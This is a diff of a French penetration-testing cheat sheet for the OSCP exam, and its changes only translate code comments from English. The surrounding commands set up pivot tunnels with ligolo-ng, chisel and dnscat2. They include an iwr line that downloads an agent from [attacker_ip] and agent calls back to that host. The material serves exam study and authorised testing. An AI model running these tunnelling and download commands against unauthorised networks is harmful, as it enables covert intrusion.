@@ -32,7 +32,7 @@ sudo ip link set ligolo up
 <p class="oscp-command-note">Script shell dans la rubrique « Tunnel simple ».</p>
 
 ```bash
-# The option -selfcert is for not using a certificate (this will make our communications in clear text), we do not need to encrypt them for the exam.
+# L'option -selfcert est de ne pas utiliser un certificat (cela fera nos communications en texte clair), nous n'avons pas besoin de les chiffrer pour l'examen.
 ./ligolo_proxy_linux -selfcert
 # Autre possibilité
 ./ligolo_proxy_linux -selfcert -port <DIFFERENT_PROXY_PORT>
@@ -49,7 +49,7 @@ iwr -uri http://[attacker_ip]/ligolo_agent_windows.exe -UseBasicParsing -Outfile
 <p class="oscp-command-note">Script PowerShell dans la rubrique « Tunnel simple ».</p>
 
 ```powershell
-# The port is the default one, we could also change it if needed.
+# Le port est le port par défaut, nous pourrions également le modifier si nécessaire.
 ./ligolo_agent_windows.exe -connect [attacker_ip]:11601 -ignore-cert
 # Autre possibilité
 ./ligolo_agent_windows.exe -connect [attacker_ip]:<DIFFERENT_PROXY_PORT> -ignore-cert
@@ -59,10 +59,10 @@ iwr -uri http://[attacker_ip]/ligolo_agent_windows.exe -UseBasicParsing -Outfile
 <p class="oscp-command-note">Examiner les interfaces et routes réseau.</p>
 
 ```bash
-# Run this command in other terminal that from the one where ligolo proxy is running
+# Exécutez cette commande dans un autre terminal que depuis celui où le proxy ligolo est exécuté
 sudo ip route add [internal_submask]/24 dev ligolo
 
-# Verify routing table
+# Vérifier la table de routage
 ip route list
 ```
 
@@ -70,11 +70,11 @@ ip route list
 <p class="oscp-command-note">Script shell dans la rubrique « Tunnel simple ».</p>
 
 ```bash
-# Run this commands in the ligolo proxy terminal
+# Exécutez ces commandes dans le terminal proxy ligolo
 » session
 » start
 
-# After this the tunneling should be ready, you could perform any command.
+# Après cela, le tunnel devrait être prêt, vous pourriez exécuter n'importe quelle commande.
 ```
 
 
@@ -97,10 +97,10 @@ sudo ip link set ligolo_double up
 <p class="oscp-command-note">Script shell dans la rubrique « Double tunnel ».</p>
 
 ```bash
-# The next step is to add a listener on port 11601 to our existing Ligolo session and redirect it to our machine. 
+# La prochaine étape est d'ajouter un auditeur sur le port 11601 à notre session Ligolo existante et de la rediriger vers notre machine.
 listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
 
-# Verify it’s been added
+# Vérifiez qu'il a été ajouté
 listener_list
 ```
 
@@ -110,7 +110,7 @@ listener_list
 
 
 ```powershell
-# Next, we need to execute the agent on the Windows host to connect to the forwarded port on our attacker machine
+# Ensuite, nous devons exécuter l'agent sur l'hôte Windows pour se connecter au port transmis sur notre machine d'attaque
 ./agent.exe -connect <IP of First Pivot Point>:11601 -ignore-cert
 ```
 
@@ -122,7 +122,7 @@ listener_list
 <p class="oscp-command-note">Examiner les interfaces et routes réseau.</p>
 
 ```bash
-# Our last step is to change our session to the second pivot point (Windows), start the tunnel, and then add a route to the newly discovered network at 10.1.30.0/24.
+# Notre dernière étape est de changer notre session en deuxième point de pivot (Windows), de démarrer le tunnel, puis d'ajouter une route au réseau nouvellement découvert à 10.1.30.0/24.
 sudo ip add route <New_Network> dev ligolo_double
 ```
 
@@ -141,7 +141,7 @@ Vérifier les ports et les services de la cible autorisée.
 <p class="oscp-command-note">Examiner les interfaces et routes réseau.</p>
 
 ```bash
-# Add a special hardcoded IP for local port forwarding.
+# Ajoutez une IP spéciale codée en dur pour le transfert de port local.
 sudo ip route add 240.0.0.1/32 dev ligolo
 ```
 
@@ -279,7 +279,7 @@ chisel server -p <LOCAL_PORT> --reverse
 # In remote machine
 chisel client <LOCAL_IP>:<LOCAL_PORT> R:<LOCAL_FORWARD_PORT>:<REMOTE_IP>:<REMOTE_PORT>
 
-# Replace <LOCAL_PORT> with the port you want Chisel to listen on locally, <LOCAL_IP> with the IP address of your local machine, <LOCAL_FORWARD_PORT> with the port on your local machine to which the remote service will be forwarded, <REMOTE_IP> with the IP address of the remote machine, and <REMOTE_PORT> with the port on the remote machine.
+# Remplacer <LOCAL_PORT> par le port que vous voulez que Chisel écoute localement, <LOCAL_IP> avec l'adresse IP de votre machine locale, <LOCAL_FORWARD_PORT> avec le port de votre machine locale auquel le service distant sera transmis, <REMOTE_IP> avec l'adresse IP de la machine distante, et <REMOTE_PORT> avec le port de la machine distante.
 ```
 
 
@@ -288,7 +288,7 @@ chisel client <LOCAL_IP>:<LOCAL_PORT> R:<LOCAL_FORWARD_PORT>:<REMOTE_IP>:<REMOTE
 ```bash
 curl http://localhost:<LOCAL_FORWARD_PORT>
 
-# The result is the content from http://<REMOTE_IP>:<REMOTE_PORT>/
+# Le résultat est le contenu de http://<REMOTE_IP>:<REMOTE_PORT>/
 ```
 
 
@@ -306,7 +306,7 @@ chisel server -p <REMOTE_PORT> --socks5
 # In local
 chisel client <REMOTE_IP>:<REMOTE_PORT> <LOCAL_PORT>:socks
 
-# Replace <REMOTE_PORT> with the port for the SOCKS proxy on the remote machine, <REMOTE_IP> with the IP address of the remote machine, and <LOCAL_PORT> with the port on your local machine where the SOCKS proxy will be available.
+# Remplacer <REMOTE_PORT> par le port du proxy SOCKS sur la machine distante, <REMOTE_IP> par l'adresse IP de la machine distante, et <LOCAL_PORT> par le port de votre machine locale où le proxy SOCKS sera disponible.
 ```
 
 
@@ -339,7 +339,7 @@ chisel server -p <LOCAL_PORT> --reverse
 # In remote machine
 chisel client <LOCAL_IP>:<LOCAL_PORT> R:<REMOTE_PORT>:socks
 
-# Replace <LOCAL_PORT> with the port you want Chisel to listen on locally, <LOCAL_IP> with the IP address of your local machine, and <REMOTE_PORT> with the port on the remote machine where the SOCKS proxy will be available.
+# Remplacer <LOCAL_PORT> par le port que vous voulez que Chisel écoute localement, <LOCAL_IP> avec l'adresse IP de votre machine locale, et <REMOTE_PORT> avec le port sur la machine distante où le proxy SOCKS sera disponible.
 ```
 
 
@@ -375,7 +375,7 @@ Interroger les enregistrements DNS et identifier les services associés.
 
 
 ```bash
-# Replace [domain] with the chosen domain
+# Remplacer [domain] par le domaine choisi
 dnscat2-server [domain]
 ```
 
@@ -387,7 +387,7 @@ dnscat2-server [domain]
 <p class="oscp-command-note">Script shell dans la rubrique « Dnscat2 (DNS Tunneling) ».</p>
 
 ```bash
-# With domain
+# Avec domaine
 ./dnscat --secret=[secret] [domain]
 
 # Directly to server
@@ -425,7 +425,7 @@ command ([session_name]) > listen 127.0.0.1:[local_port] [target_ip]:[target_por
 <p class="oscp-command-note">Parcourir un partage SMB.</p>
 
 ```bash
-# Example command
+# Exemple de commande
 smbclient -p [local_port] -L //127.0.0.1 -U [username] --password=[password]
 ```
 
